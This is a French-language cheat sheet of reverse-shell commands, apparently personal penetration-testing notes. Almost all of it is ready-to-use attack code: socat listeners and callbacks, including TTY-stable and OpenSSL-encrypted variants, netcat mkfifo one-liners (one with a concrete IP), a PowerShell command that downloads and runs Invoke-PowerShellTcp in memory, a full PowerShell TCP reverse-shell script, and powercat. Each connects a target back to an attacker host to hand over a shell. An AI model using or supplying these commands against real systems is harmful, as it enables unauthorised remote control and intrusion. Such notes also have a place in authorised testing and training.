Se produise lorsque la cible est obligée d’exécuter du code qui se reconnecte _à_ votre ordinateur.

C'est un bon moyen de contourner les règles de pare-feu qui peuvent vous empêcher de vous connecter à des ports arbitraires sur la cible

**cependant, l'inconvénient est que, lorsque vous recevez un shell d'une machine via Internet, vous devrez configurer votre propre réseau pour accepter le shell.**


# socat
linux, windows

Ecouteur de shell socat

```
socat TCP-L:4444 -
```


```sh
socat TCP:<ATTACK-IP>:<PORT> EXEC:powershell.exe,pipes
```

```
socat TCP:<ATTACK-IP>:<PORT> EXEC:"bash -li"
```

###### Shell inversé Linux TTY entièrement stable
Ecouteur:

```sh
socat TCP-L:4444 FILE:`tty`,raw,echo=0
```


```sh
socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

###### Shell cryptées

Générer un certificat afin d'utiliser des shells cryptés

```sh
openssl req --newkey rsa:2028 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

Fusionner les deux fichiers en un seul 

```sh
cat shell.key shell.crt > shell.pem
```

Ecouteur:

```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```


```sh
socat OPENSSL:<ATTACKER-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

---
### Shell communes
#linux 

Ecouteur

```
nc -nlvp <PORT>
```

```sh
mkfifo /tmp/f; nc <ATTACK-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.113.150 9001 >/tmp/f
```


# powershell 
#windows 

Telecharger et executer un reverse-shell en memoire

```c
powershell iex (New-Object Net.WebClient).DownloadString('http://ip:port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ATTACK-IP} -Port 443
```

Executer ceci dans powershell

```c
$client = New-Object System.Net.Sockets.TCPClient('ATTACK-IP', '443');
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
	$sendback = (iex $data 2>&1 | Out-String);
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
```

# powercat
C'est la version powershell de netcat

```c
. .\powercat.ps1
#powercat -h
 powercat -c ATTACK-IP -p 9001 -e cmd -v
```